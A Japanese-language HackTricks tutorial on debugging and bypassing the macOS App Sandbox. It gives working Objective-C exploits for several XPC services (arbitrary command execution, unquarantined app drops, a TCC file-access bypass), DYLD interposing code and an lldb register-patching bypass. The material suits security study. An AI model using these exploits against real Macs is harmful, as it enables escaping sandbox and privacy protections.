# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

前の画像では、entitlement **`com.apple.security.app-sandbox`** を持つアプリケーションが実行された際に、**sandbox がどのようにロードされるか**を確認できます。

コンパイラは `/usr/lib/libSystem.B.dylib` をバイナリに link します。

その後、**`libSystem.B`** が複数の関数を呼び出し、最終的に **`xpc_pipe_routine`** がアプリの entitlements を **`securityd`** に送信します。securityd はプロセスを Sandbox 内で quarantine すべきかを確認し、必要であれば quarantine します。\
最後に、sandbox は **`__sandbox_ms`** を呼び出すことで有効化され、これは **`__mac_syscall`** を呼び出します。

## Possible Bypasses

### Bypassing quarantine attribute

**sandboxed processes が作成したファイル**には、sandbox escapes を防ぐために **quarantine attribute** が付加されます。ファイルを新しいアプリとして配置して起動しようとしても、quarantine flag によって阻止されます。したがって、**quarantine attribute なしでファイルまたはフォルダを配置できれば、App Sandbox から escape できます** — `.app` bundle を配置し、`open` で起動するだけです。新しく起動されたプロセスは LaunchServices の下で実行され、あなたの sandbox の下では実行されないためです。

**unquarantined drop** を確実に行う方法は、**別のプロセスにファイルを作成させる**ことです。Mickey Jin による [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) に記載されているように、**App Sandbox** は drop されたファイルに quarantine を付加しますが、Service Sandbox の下で実行される XPC services は付加しません。そのため、認証されていない複数の XPC services を "quarantine laundering" primitive として利用できます。

- **CVE-2023-27944** (`TrialArchivingService`) および **CVE-2023-32414** (`ArchiveService`): sandboxed app から渡された archive を指定した場所に展開しますが、展開されたコンテンツに quarantine xattr を **propagating しません**。
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` の path traversal により、quarantine なしで **arbitrary directories** を作成できました。これだけで、container の外側に `.app` bundle 全体の構造を構築できます。
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantined DMG を attach しますが、結果として作成される device を quarantine しないため、mount された volume 上のアプリを起動できます。

> [!TIP]
> 通常、extraction によって **executable permission bit が削除されます**。CVE-2023-27944 で使用された workaround は、bundle の main executable として既存の署名済み system binary（例: `/System/Library/CoreServices/Automator Application Stub`）への **symlink** を配置する方法でした。これにより、drop されたファイルに `+x` がなくても起動可能な状態が維持されます。

> [!CAUTION]
> これが機能する理由は、check が起動対象の item に付いた **flag によって行われる**ためです。*「Finder または GUI から app やその他の executable code が実行されると、macOS はロード前に quarantine flag を確認する」*、そしてその後にのみ *「Gatekeeper に渡され、完全な 'first run' security checks が行われる」* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)) という流れです。起動する bundle に flag がなければ Gatekeeper pass もありません — まさに上記の CVEs が提供する primitive です。
>
> `.app` bundle がすでに実行を認証されている場合（"authorized to run" flag が付いた quarantine xattr がある場合）も abuse できます。ただし、この場合は privileged TCC perms がない限り **`.app`** bundles 内に write できません（sandbox 内ではその権限を持てません）。

### Abusing Open functionality

[**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) では、**`open`** cli functionality を abuse して sandbox を bypass する方法を確認できます。


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

アプリケーションが **sandboxed であることを意図されている**場合（`com.apple.security.app-sandbox`）でも、例えば **LaunchAgent**（`~/Library/LaunchAgents`）から **executed** されるようにすれば、sandbox を bypass できます。\
[**this post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) で説明されているように、sandboxed なアプリケーションで persistence を獲得したい場合、LaunchAgent として自動的に実行されるようにし、DyLib environment variables を介して malicious code を inject できます。

### Abusing Auto Start Locations

sandboxed process が、**後で unsandboxed application が binary を実行する場所に write** できる場合、その場所に binary を **place するだけで escape** できます。この種の location の良い例は `~/Library/LaunchAgents` や `/System/Library/LaunchDaemons` です。

このためには、**2 steps** が必要になる場合もあります。より **permissive sandbox**（`file-read*`, `file-write*`）を持つ process に、実際に code を write する処理を execute させます。その code は、**unsandboxed で実行される場所**に配置されます。

**Auto Start locations** については、このページを確認してください。


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

その sandbox process から、より制限の緩い sandbox（または sandbox なし）で実行されている **他の process を compromise** できれば、その process の sandbox へ escape できます。


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Available System and User Mach services

sandbox では、profile `application.sb` で定義された XPC を介して、特定の **Mach services** と通信することも許可されています。これらの services のいずれかを **abuse** できれば、**sandbox から escape** できる可能性があります。

[この writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) に示されているように、Mach services に関する情報は `/System/Library/xpc/launchd.plist` に保存されています。そのファイル内で `<string>System</string>` および `<string>User</string>` を検索すると、すべての System および User Mach services を見つけられます。

さらに、`bootstrap_look_up` を呼び出すことで、Mach service が sandboxed application から利用可能かどうかを確認できます。
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### 利用可能な PID Mach services

これらの Mach services は、[この writeup で sandbox から脱出するために悪用されました](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)。当時、アプリケーションとその framework に必要な **すべての XPC services** が、アプリの PID domain から確認できました（これらは `ServiceType` が `Application` の Mach Services です）。

**PID Domain XPC service に接続する**には、次のような行でアプリ内に登録するだけです：
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
さらに、`System/Library/xpc/launchd.plist` 内で `<string>Application</string>` を検索すると、すべての **Application** Mach services を見つけることができます。

有効な xpc services を見つける別の方法は、以下にあるものを確認することです:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
この technique を悪用した複数の例は[**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)にありますが、以下にいくつかの要約例を示します。

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

この service は常に `YES` を返すことで、すべての XPC connection を許可します。また、`runTask:arguments:withReply:` method は任意の params を指定して任意の command を実行します。

この exploit は「次のように簡単なものでした。」
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

この XPC service は常に YES を返すことで、すべての client を許可していました。また、`createZipAtPath:hourThreshold:withReply:` メソッドは、基本的に圧縮するフォルダーの path を指定すると、そのフォルダーを ZIP file に圧縮できるものでした。

そのため、偽の app folder structure を生成して圧縮し、その後 decompress して実行することで sandbox を脱出できます。新しく作成された files には quarantine attribute が付与されないためです。

exploit は次のとおりです。
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

この XPC service は、任意の URL への読み取りおよび書き込みアクセスを、任意の接続を受け入れるメソッド `extendAccessToURL:completion:` を介して XPC client に付与できます。XPC service は FDA を持つため、これらの権限を悪用して TCC を完全に bypass することが可能です。

exploit の手順は以下のとおりです。
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Static Compiling & Dynamically linking

[**この調査**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、Sandboxをbypassする2つの方法が発見されました。Sandboxは**libSystem**ライブラリのロード時にuserlandから適用されるためです。バイナリがこのライブラリのロードを回避できれば、Sandboxが適用されることはありません。

- バイナリが**完全に静的コンパイル**されていれば、このライブラリのロードを回避できます。
- **バイナリがライブラリを一切ロードする必要がなければ**（linkerもlibSystem内にあるため）、libSystemをロードする必要はありません。

### Shellcodes

ARM64の**shellcodes**でさえ、`libSystem.dylib`にリンクする必要があることに注意してください。
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 継承されない制限

**[この writeup の bonus](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** で説明されているように、次のような sandbox restriction は:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
例えば、以下を実行する新しい process によって bypass できます：
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
しかし、当然ながら、この新しいプロセスは親プロセスから entitlements や privileges を継承しません。

### Entitlements

アプリケーションが特定の **entitlement** を持っている場合、次の例のように、一部の **actions** が **sandbox** によって **allowed** になることがあります。
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting** の詳細については、以下を確認してください。


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### sandbox を防止するために `_libsecinit_initializer` を Interpostする
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` で Sandbox を防止する
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb で Sandbox をデバッグおよび bypass

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

その後、アプリをコンパイルします：
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> アプリは **`~/Desktop/del.txt`** ファイルを **read** しようとしますが、**Sandbox** によって許可されません。\
> **Sandbox** を bypass すると読み取れるようになるため、そこにファイルを作成します：
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

アプリケーションを debug して、Sandbox がいつ load されるか確認しましょう：
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Sandbox を bypassed しても、TCC** はプロセスによる desktop 上のファイルの読み取りを許可するかユーザーに尋ねます

## 参照

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)
- [Mickey Jin - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)（XPC services 経由の unquarantined drops: CVE-2023-27944、CVE-2023-32414、CVE-2023-42977、CVE-2024-27864）
- [The Eclectic Light Company - Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)

{{#include ../../../../../banners/hacktricks-training.md}}
